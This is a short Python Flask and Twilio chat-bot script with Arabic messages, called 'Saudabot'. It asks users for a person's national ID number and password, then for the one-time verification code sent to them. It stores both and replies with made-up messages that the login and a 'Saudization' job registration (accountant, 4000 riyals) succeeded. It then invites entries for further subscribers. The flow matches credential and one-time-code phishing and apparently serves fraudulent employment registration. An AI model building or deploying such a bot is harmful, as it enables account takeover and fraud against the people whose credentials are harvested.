from flask import Flask, request
from twilio.twiml.messaging_response import MessagingResponse

app = Flask(__name__)

# حالة المستخدم المؤقتة (تقدر تستبدلها بقاعدة بيانات لاحقاً)
user_sessions = {}

@app.route("/")
def home():
    return "✅ Saudabot is running!"

@app.route("/bot", methods=["POST"])
def bot():
    sender = request.form.get("From")
    incoming_msg = request.form.get("Body", "").strip().lower()
    resp = MessagingResponse()
    msg = resp.message()

    # إنشاء جلسة إذا ما كانت موجودة
    if sender not in user_sessions:
        user_sessions[sender] = {"step": "start"}

    session = user_sessions[sender]

    # المرحلة 1 - البداية
    if "سعودة" in incoming_msg:
        session["step"] = "طلب_البيانات"
        msg.body("📝 أرسل رقم الهوية وكلمة المرور بهالشكل:\nهوية: 1234567890\nكلمة: yourPassword")

    # المرحلة 2 - الهوية وكلمة المرور
    elif session["step"] == "طلب_البيانات" and incoming_msg.startswith("هوية:") and "كلمة:" in incoming_msg:
        session["step"] = "طلب_الكود"
        session["credentials"] = incoming_msg
        msg.body("📲 أرسل كود التحقق اللي وصلك عشان نسجل دخولك... اكتب بالشكل:\nكود: 1234")

    # المرحلة 3 - كود التحقق
    elif session["step"] == "طلب_الكود" and incoming_msg.startswith("كود:"):
        session["step"] = "تنفيذ_السعودة"
        session["code"] = incoming_msg
        msg.body("✅ تم تسجيل الدخول بنجاح.\nجاري تنفيذ عملية السعودة...\n💼 المهنة: محاسب\n💰 الراتب: 4000 ريال")

    # المرحلة 4 - تأكيد
    elif session["step"] == "تنفيذ_السعودة":
        msg.body("📄 تم تسجيل السعودة بنجاح.\nهل تريد المتابعة لمشترك آخر؟\n\n- أرسل 'متابعة' للاستمرار\n- أرسل 'إلغاء' لإنهاء الجلسة")

    # متابعة
    elif incoming_msg == "متابعة":
        session["step"] = "طلب_البيانات"
        msg.body("🔁 أرسل بيانات الشخص الثاني:\nهوية: ...\nكلمة: ...")

    # إلغاء
    elif incoming_msg == "الغاء":
        user_sessions.pop(sender, None)
        msg.body("❌ تم إنهاء الجلسة.\nاكتب 'سعودة' للبدء من جديد.")

    else:
        msg.body("🤖 مرحباً بك في بوت السعودة.\nأرسل كلمة 'سعودة' للبدء.")

    return str(resp)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
